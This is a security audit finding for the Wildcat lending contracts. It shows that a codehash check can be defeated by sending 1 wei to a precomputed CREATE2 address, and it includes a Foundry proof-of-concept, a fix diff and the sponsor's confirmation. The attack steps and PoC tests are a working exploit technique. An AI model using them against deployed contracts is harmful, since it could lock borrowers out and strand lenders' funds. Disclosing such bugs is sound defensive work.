[H-02]codehashcheck in factory contracts does not account for non-empty addresses
Submitted byMiloTruck, also found by Robert (1,2,3) and0xDING99YA
InWildcatMarketControllerFactory.sol, registered borrowers can calldeployController()to deploy aWildcatMarketControllercontract for themselves.
The function checks if thecodehashof the controller address isbytes32(0)to determine if the controller has already been deployed:
WildcatMarketControllerFactory.sol#L287-L296
// Salt is borrower addressbytes32salt=bytes32(uint256(uint160(msg.sender)));controller=LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix,salt,controllerInitCodeHash);if(controller.codehash!=bytes32(0)) {// auditor: This checkrevertControllerAlreadyDeployed();}
This same check is also used indeployMarket(), which is called by borrowers to deploy markets:
WildcatMarketController.sol#L349-L353
bytes32salt=_deriveSalt(asset,namePrefix,symbolPrefix);market=LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix,salt,marketInitCodeHash);if(market.codehash!=bytes32(0)) {revertMarketAlreadyDeployed();}
This check also exists increateEscrow(), which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:
WildcatSanctionsSentinel.sol#L104-L106
escrowContract=getEscrowAddress(borrower,account,asset);if(escrowContract.codehash!=bytes32(0))returnescrowContract;
However, this<address>.codehash != bytes32(0)check is insufficient to determine if an address has existing code. According toEIP-1052, addresses without code only return a0x0codehash when they areempty:
In case the account does not exist or is empty (as defined byEIP-161)0is pushed to the stack.In case the account does not have code the keccak256 hash of empty data (i.e.c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470) is pushed to the stack.
As seen from above, addresses without code can also returnkeccak256("")as itscodehashif it is non-empty.EIP-161states that an address must have a zero ETH balance for it to be empty:
An account is consideredemptywhen it hasno codeandzero nonceandzero balance.
As such, if anyone transfers 1 wei to an address,.codehashwill returnkeccak256("")instead ofbytes32(0), making the checks shown above pass incorrectly.
Since all contract deployments in the protocol useCREATE2, a malicious attacker can harm users by doing the following:
For controller deployments:Attacker callscomputeControllerAddress()to compute the controller address for a borrower.Attacker transfers 1 wei to it, causing.codehashto become non-zero.WhendeployController()is called by the borrower, the check passes, causing the function to revert.For market deployments:Attacker callscomputeMarketAddress()with arguments such that the deployment salt is the same.Attacker transfers 1 wei to the resulting market address, causing.codehashto become non-zero.WhendeployMarket()is called by the borrower, the function reverts.For escrow deployments:Attacker callsgetEscrowAddress()with theborrower, sanctionedlenderand market/asset address to compute the resulting escrow address.Attacker transfers 1 wei to the escrow address, causing.codehashto become non-zero.When eithernukeFromOrbit()orexecuteWithdrawal()is called,createEscrow()simply returns the escrow address instead of deploying an escrow contract.The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.
Note that for controller deployments, since the salt is fixed to theborroweraddress and cannot be varied, the DOS fordeployController()is permanent. This effectively locks theborrowerout of all protocol functionality forever since they can never deploy a market controller for themselves.
Impact
An attacker can do the following at the cost of 1 wei and some gas:
Permanently lock a registered borrower out of all borrowing-related functionality by forcingdeployController()to always revert for their address.Grief market deployments by causingdeployMarket()to always revert for a givenborrower,lenderandmarket.Cause a sanctioned lender to lose all their funds in a market whennukeFromOrbit()orexecuteWithdrawal()is called for their address.
Proof of Concept
The code below contains three tests:
test_CanDOSControllerDeployment()demonstrates how an attacker can forcedeployController()to revert permanently for a borrower by transferring 1 wei to the computed controller address.test_CanDOSMarketDeployment()demonstrates howdeployMarket()can be forced to revert with the same attack.test_CanSkipEscrowDeployment()shows how an attacker can skip the escrow deployment for a lender if they get blocked, causing their market tokens to be unrecoverable.
// SPDX-License-Identifier: MITpragmasolidity>=0.8.20;import'src/WildcatSanctionsSentinel.sol';import'src/WildcatArchController.sol';import'src/WildcatMarketControllerFactory.sol';import'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';import'forge-std/Test.sol';import'test/shared/TestConstants.sol';import'test/helpers/MockERC20.sol';contractCodeHashTestisTest,IWildcatMarketControllerEventsAndErrors{// Wildcat contractsaddressMOCK_CHAINALYSIS_ADDRESS=address(0x1337);WildcatSanctionsSentinelsentinel;WildcatArchControllerarchController;WildcatMarketControllerFactorycontrollerFactory;// Test contractsMockERC20asset;// UsersaddressAIKEN;addressDUEET;functionsetUp()external{// Deploy Wildcat contractsarchController=newWildcatArchController();sentinel=newWildcatSanctionsSentinel(address(archController),MOCK_CHAINALYSIS_ADDRESS);MarketParameterConstraintsmemoryconstraints=MarketParameterConstraints({minimumDelinquencyGracePeriod:MinimumDelinquencyGracePeriod,maximumDelinquencyGracePeriod:MaximumDelinquencyGracePeriod,minimumReserveRatioBips:MinimumReserveRatioBips,maximumReserveRatioBips:MaximumReserveRatioBips,minimumDelinquencyFeeBips:MinimumDelinquencyFeeBips,maximumDelinquencyFeeBips:MaximumDelinquencyFeeBips,minimumWithdrawalBatchDuration:MinimumWithdrawalBatchDuration,maximumWithdrawalBatchDuration:MaximumWithdrawalBatchDuration,minimumAnnualInterestBips:MinimumAnnualInterestBips,maximumAnnualInterestBips:MaximumAnnualInterestBips});controllerFactory=newWildcatMarketControllerFactory(address(archController),address(sentinel),constraints);// Register controllerFactory in archControllerarchController.registerControllerFactory(address(controllerFactory));// Deploy asset tokenasset=newMockERC20();// Setup Aiken and register him as borrowerAIKEN=makeAddr("AIKEN");archController.registerBorrower(AIKEN);// Setup Dueet and give him some asset tokenDUEET=makeAddr("DUEET");asset.mint(DUEET,1000e18);}functiontest_CanDOSControllerDeployment()public{// Dueet front-runs Aiken and transfers 1 wei to Aiken's controller addressaddresscontrollerAddress=controllerFactory.computeControllerAddress(AIKEN);payable(controllerAddress).transfer(1);// Codehash of Aiken's controller address is now keccak256("")assertEq(controllerAddress.codehash,keccak256(""));// Aiken calls deployController(), but it reverts due to non-zero codehashvm.prank(AIKEN);vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);controllerFactory.deployController();}functiontest_CanDOSMarketDeployment()public{// Deploy WildcatMarketController for Aiken(WildcatMarketControllercontroller, ) =_deployControllerAndMarket(AIKEN,address(0),"_","_");// Dueet front-runs Aiken and transfers 1 wei to market addressstringmemorynamePrefix="Market Token";stringmemorysymbolPrefix="MKT";addressmarketAddress=controller.computeMarketAddress(address(asset),namePrefix,symbolPrefix);payable(marketAddress).transfer(1);// Codehash of market address is now keccak256("")assertEq(marketAddress.codehash,keccak256(""));// Aiken calls deployMarket(), but it reverts due to non-zero codehashvm.prank(AIKEN);vm.expectRevert(MarketAlreadyDeployed.selector);controller.deployMarket(address(asset),namePrefix,symbolPrefix,type(uint128).max,MaximumAnnualInterestBips,MaximumDelinquencyFeeBips,MaximumWithdrawalBatchDuration,MaximumReserveRatioBips,MaximumDelinquencyGracePeriod);}functiontest_CanSkipEscrowDeployment()public{// Deploy WildcatMarketController and WildcatMarket for Aiken(WildcatMarketControllercontroller,WildcatMarketmarket) =_deployControllerAndMarket(AIKEN,address(asset),"Market Token","MKT");// Register Dueet as lenderaddress[]memoryarr=newaddress[](1);arr[0] =DUEET;vm.prank(AIKEN);controller.authorizeLenders(arr);// Dueet becomes a lender in the marketvm.startPrank(DUEET);asset.approve(address(market),1000e18);market.depositUpTo(1000e18);vm.stopPrank();// Dueet becomes sanctionedvm.mockCall(MOCK_CHAINALYSIS_ADDRESS,abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),abi.encode(true));// Attacker transfers 1 wei to Dueet's escrow address// Note: Borrower and lender addresses are swapped due to a separate bugaddressescrowAddress=sentinel.getEscrowAddress(DUEET,AIKEN,address(market));payable(escrowAddress).transfer(1);// Codehash of market address is now keccak256("")assertEq(escrowAddress.codehash,keccak256(""));// Dueet gets blocked in marketmarket.nukeFromOrbit(DUEET);// Dueet's MKT tokens are transferred to his escrow addressassertEq(market.balanceOf(escrowAddress),1000e18);// However, the escrow contract was not deployedassertEq(escrowAddress.code.length,0);}function_deployControllerAndMarket(addressuser,address_asset,stringmemorynamePrefix,stringmemorysymbolPrefix)internalreturns(WildcatMarketController,WildcatMarket){vm.prank(user);(addresscontroller,addressmarket) =controllerFactory.deployControllerAndMarket(namePrefix,symbolPrefix,_asset,type(uint128).max,MaximumAnnualInterestBips,MaximumDelinquencyFeeBips,MaximumWithdrawalBatchDuration,MaximumReserveRatioBips,MaximumDelinquencyGracePeriod);return(WildcatMarketController(controller),WildcatMarket(market));}}
Recommended Mitigation
Consider checking if the codehash of an address is notkeccak256("")as well:
WildcatMarketControllerFactory.sol#L294-L296
-   if (controller.codehash != bytes32(0)) {+   if (controller.codehash != bytes32(0) && controller.codehash != keccak256("")) {revert ControllerAlreadyDeployed();}
WildcatMarketController.sol#L351-L353
-   if (market.codehash != bytes32(0)) {+   if (market.codehash != bytes32(0) && market.codehash != keccak256("")) {revert MarketAlreadyDeployed();}
WildcatSanctionsSentinel.sol#L106
-   if (escrowContract.codehash != bytes32(0)) return escrowContract;+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256("") return escrowContract;
Alternatively, use<address>.code.length != 0to check if an address has code instead.
Assessed type
Invalid Validation
laurenceday (Wildcat) commented:
Fix for this is easier than suggested - just change fromx.codehash != bytes32(0)tox.code.length != 0.Mitigatedhereandhere.I’d emphasise here, however, that this is only a High Risk finding in the escrow situation - the others are grieving attacks that cause nothing to be “lost”. Still a valuable finding, mind.
laurenceday (Wildcat) confirmed